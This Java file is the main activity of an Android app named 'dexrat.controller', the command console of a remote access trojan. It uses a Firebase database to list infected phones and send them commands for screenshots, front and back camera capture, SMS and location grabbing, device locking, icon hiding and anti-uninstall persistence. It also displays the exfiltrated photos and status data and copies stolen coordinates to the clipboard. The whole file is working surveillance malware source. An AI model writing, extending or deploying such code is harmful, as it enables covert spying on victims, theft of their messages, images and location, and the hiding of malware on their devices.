package com.dexrat.controller;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Bundle;
import android.util.Base64;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.ImageView;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.database.ServerValue;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class MainActivity extends AppCompatActivity {
    private FirebaseDatabase db;
    private String selectedId = null;
    private DatabaseReference currentDataRef;
    private ValueEventListener currentDataListener;
    
    private Spinner deviceSpinner;
    private ImageView liveView;
    private TextView statusText, logText, placeholder, txtDeviceInfo;
    private View statusIndicator;
    private View tabControl, tabMedia, tabSystem;
    private View cardLiveFeed;
    private Bitmap currentBitmap;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        initUI();
        db = FirebaseDatabase.getInstance("https://bondexrat-default-rtdb.firebaseio.com/");
        listenDevices();
    }

    private com.google.android.material.button.MaterialButton btnAntiUninstall, btnHideIcon;

    private void initUI() {
        deviceSpinner = findViewById(R.id.deviceSpinner);
        liveView = findViewById(R.id.liveView);
        statusText = findViewById(R.id.statusText);
        logText = findViewById(R.id.logText);
        placeholder = findViewById(R.id.placeholder);
        txtDeviceInfo = findViewById(R.id.txtDeviceInfo);
        statusIndicator = findViewById(R.id.statusIndicator);
        cardLiveFeed = findViewById(R.id.cardLiveFeed);

        tabControl = findViewById(R.id.tab_control);
        tabMedia = findViewById(R.id.tab_media);
        tabSystem = findViewById(R.id.tab_system);

        btnAntiUninstall = findViewById(R.id.btnAntiUninstall);
        btnHideIcon = findViewById(R.id.btnHideIcon);

        com.google.android.material.tabs.TabLayout tabs = findViewById(R.id.tabLayout);
        tabs.addOnTabSelectedListener(new com.google.android.material.tabs.TabLayout.OnTabSelectedListener() {
            @Override
            public void onTabSelected(com.google.android.material.tabs.TabLayout.Tab tab) {
                tabControl.setVisibility(View.GONE);
                tabMedia.setVisibility(View.GONE);
                tabSystem.setVisibility(View.GONE);

                switch (tab.getPosition()) {
                    case 0: tabControl.setVisibility(View.VISIBLE); break;
                    case 1: tabMedia.setVisibility(View.VISIBLE); break;
                    case 2: tabSystem.setVisibility(View.VISIBLE); break;
                }
            }
            @Override public void onTabUnselected(com.google.android.material.tabs.TabLayout.Tab tab) {}
            @Override public void onTabReselected(com.google.android.material.tabs.TabLayout.Tab tab) {}
        });

        // TAB COMMAND
        findViewById(R.id.btnLock).setOnClickListener(v -> sendCmd("lock"));
        findViewById(R.id.btnUnlock).setOnClickListener(v -> sendCmd("unlock"));
        findViewById(R.id.btnLocation).setOnClickListener(v -> sendCmd("location"));
        findViewById(R.id.btnSMS).setOnClickListener(v -> sendCmd("sms"));
        findViewById(R.id.btnAntiUninstall).setOnClickListener(v -> sendCmd("anti_uninstall"));

        // TAB VISUAL
        findViewById(R.id.btnScreenshot).setOnClickListener(v -> sendCmd("screenshot"));
        findViewById(R.id.btnFrontCam).setOnClickListener(v -> sendCmd("front_camera"));
        findViewById(R.id.btnBackCam).setOnClickListener(v -> sendCmd("camera"));
        
        // TAB CORE
        findViewById(R.id.btnCheckPerms).setOnClickListener(v -> sendCmd("check_perms"));
        findViewById(R.id.btnHideIcon).setOnClickListener(v -> sendCmd("hide_icon"));

        findViewById(R.id.btnWipe).setOnClickListener(v -> {
            if (selectedId == null) { Toast.makeText(this, "Select a device first", Toast.LENGTH_SHORT).show(); return; }
            new androidx.appcompat.app.AlertDialog.Builder(this)
                    .setTitle("Wipe Data")
                    .setMessage("Are you sure you want to permanently delete all data from this device?")
                    .setPositiveButton("WIPE", (dialog, which) -> {
                        currentDataRef.removeValue().addOnSuccessListener(aVoid -> {
                            disconnect();
                            addLog("Device data wiped.");
                        });
                    })
                    .setNegativeButton("CANCEL", null)
                    .show();
        });

        deviceSpinner.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                String item = (String) parent.getItemAtPosition(position);
                if (item.equals("Select Device")) {
                    disconnect();
                } else {
                    selectedId = item.substring(item.lastIndexOf("[") + 1, item.lastIndexOf("]"));
                    listenData(selectedId);
                    statusText.setText("CONNECTED");
                }
            }
            @Override public void onNothingSelected(AdapterView<?> parent) {}
        });
    }

    private void disconnect() {
        selectedId = null;
        if (currentDataRef != null && currentDataListener != null) {
            currentDataRef.removeEventListener(currentDataListener);
        }
        currentDataRef = null;
        statusText.setText("OFFLINE");
        statusIndicator.setBackgroundTintList(android.content.res.ColorStateList.valueOf(0xFF969384));
        currentBitmap = null;
        liveView.setImageBitmap(null);
        cardLiveFeed.setVisibility(View.GONE);
        placeholder.setVisibility(View.VISIBLE);
        deviceSpinner.setSelection(0);
        addLog("Disconnected from device.");
    }

    private void sendCmd(String cmd) {
        if (selectedId == null) {
            Toast.makeText(this, "No device selected", Toast.LENGTH_SHORT).show();
            return;
        }

        String finalCmd = cmd;
        if (cmd.equals("anti_uninstall")) {
            boolean current = btnAntiUninstall.getText().toString().endsWith("ON");
            finalCmd = "anti_uninstall:" + (current ? "off" : "on");
        } else if (cmd.equals("hide_icon")) {
            boolean current = btnHideIcon.getText().toString().endsWith("ON");
            finalCmd = "hide_icon:" + (current ? "off" : "on");
        } else if (cmd.equals("front_camera")) {
            finalCmd = "camera_front";
        } else if (cmd.equals("camera")) {
            finalCmd = "camera_back";
        }

        Map<String, Object> m = new HashMap<>();
        m.put("cmd", finalCmd);
        m.put("target", selectedId);
        m.put("t", ServerValue.TIMESTAMP);
        db.getReference("commands").setValue(m);
        addLog("Echo Sent: " + finalCmd);
    }

    private List<String> lastDeviceList = new ArrayList<>();

    private void listenDevices() {
        db.getReference("devices").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                List<String> newList = new ArrayList<>();
                newList.add("Select Device");
                int selectedPos = 0;
                int count = 1;
                long now = System.currentTimeMillis();
                
                for (DataSnapshot ds : snapshot.getChildren()) {
                    Long lastSeen = ds.child("last_seen").getValue(Long.class);
                    boolean isOnline = lastSeen != null && (now - lastSeen) < 60000;
                    
                    String id = ds.getKey();
                    String name = ds.child("name").getValue(String.class);
                    String item = (isOnline ? "● " : "○ ") + name + " [" + id + "]";
                    newList.add(item);
                    if (id != null && id.equals(selectedId)) {
                        selectedPos = count;
                        statusIndicator.setBackgroundTintList(android.content.res.ColorStateList.valueOf(isOnline ? 0xFFC2A87E : 0xFF8E4D4D));
                    }
                    count++;
                }

                if (!newList.equals(lastDeviceList)) {
                    lastDeviceList = new ArrayList<>(newList);
                    ArrayAdapter<String> adapter = new ArrayAdapter<String>(MainActivity.this, android.R.layout.simple_spinner_item, newList) {
                        @NonNull @Override
                        public View getView(int position, android.view.View convertView, @NonNull android.view.ViewGroup parent) {
                            TextView v = (TextView) super.getView(position, convertView, parent);
                            v.setTextColor(getResources().getColor(R.color.onSurfaceVariant));
                            v.setTextSize(14);
                            v.setPadding(0, 0, 0, 0);
                            return v;
                        }
                        @Override
                        public View getDropDownView(int position, View convertView, @NonNull android.view.ViewGroup parent) {
                            TextView v = (TextView) super.getDropDownView(position, convertView, parent);
                            v.setTextColor(getResources().getColor(R.color.onSurfaceVariant));
                            v.setBackgroundColor(getResources().getColor(R.color.surfaceVariant));
                            v.setPadding(48, 32, 48, 32);
                            return v;
                        }
                    };
                    adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
                    deviceSpinner.setAdapter(adapter);
                    deviceSpinner.setSelection(selectedPos);
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });
    }

    private void listenData(String id) {
        if (currentDataRef != null && currentDataListener != null) {
            currentDataRef.removeEventListener(currentDataListener);
        }
        currentDataRef = db.getReference("data").child(id);
        currentDataListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.hasChild("camera")) updateImage(snapshot.child("camera").getValue(String.class));
                else if (snapshot.hasChild("screenshot")) updateImage(snapshot.child("screenshot").getValue(String.class));

                if (snapshot.hasChild("status")) {
                    DataSnapshot status = snapshot.child("status");
                    Boolean anti = status.child("anti_uninstall").getValue(Boolean.class);
                    Boolean hide = status.child("icon_hidden").getValue(Boolean.class);
                    
                    if (anti != null) btnAntiUninstall.setText("Anti-Uninstall: " + (anti ? "ON" : "OFF"));
                    if (hide != null) btnHideIcon.setText("Hide Icon: " + (hide ? "ON" : "OFF"));

                    StringBuilder sb = new StringBuilder();
                    sb.append("MODEL: ").append(status.child("name").getValue() != null ? status.child("name").getValue() : "Unknown").append("\n");
                    sb.append("BATTERY: ").append(status.child("battery").getValue() != null ? status.child("battery").getValue() : "N/A").append("\n");
                    sb.append("NETWORK: ").append(status.child("network").getValue() != null ? status.child("network").getValue() : "N/A").append("\n");
                    sb.append("PERMISSION: ").append(Boolean.TRUE.equals(status.child("permissions_granted").getValue(Boolean.class)) ? "GRANTED" : "DENIED").append("\n");
                    sb.append("LOCKED: ").append(Boolean.TRUE.equals(status.child("is_locked").getValue(Boolean.class)) ? "YES" : "NO");
                    txtDeviceInfo.setText(sb.toString());
                }

                if (snapshot.hasChild("location")) {
                    try {
                        DataSnapshot locSnap = snapshot.child("location");
                        String url = locSnap.child("url").getValue(String.class);
                        if (url != null) {
                            copyToClipboard(url);
                            locSnap.getRef().removeValue();
                        }
                    } catch (Exception ignored) {}
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        };
        currentDataRef.addValueEventListener(currentDataListener);
    }

    private void updateImage(String b64) {
        if (b64 == null || b64.isEmpty()) return;
        try {
            byte[] decodedString = Base64.decode(b64.trim(), Base64.DEFAULT);
            Bitmap decodedByte = BitmapFactory.decodeByteArray(decodedString, 0, decodedString.length);
            if (decodedByte != null) {
                runOnUiThread(() -> {
                    currentBitmap = decodedByte;
                    liveView.setImageBitmap(decodedByte);
                    placeholder.setVisibility(View.GONE);
                    cardLiveFeed.setVisibility(View.VISIBLE);
                });
            }
        } catch (Exception ignored) {}
    }

    private void addLog(String msg) {
        runOnUiThread(() -> {
            String time = new java.text.SimpleDateFormat("HH:mm", java.util.Locale.getDefault()).format(new java.util.Date());
            logText.append("\n[" + time + "] " + msg);
            final View scroll = findViewById(R.id.logScroll);
            if (scroll != null) {
                scroll.post(() -> ((android.widget.ScrollView) scroll).fullScroll(View.FOCUS_DOWN));
            }
        });
    }

    private void copyToClipboard(String text) {
        runOnUiThread(() -> {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("URL", text);
            if (clipboard != null) {
                clipboard.setPrimaryClip(clip);
                Toast.makeText(this, "Device coordinates acquired.", Toast.LENGTH_SHORT).show();
            }
        });
    }
}
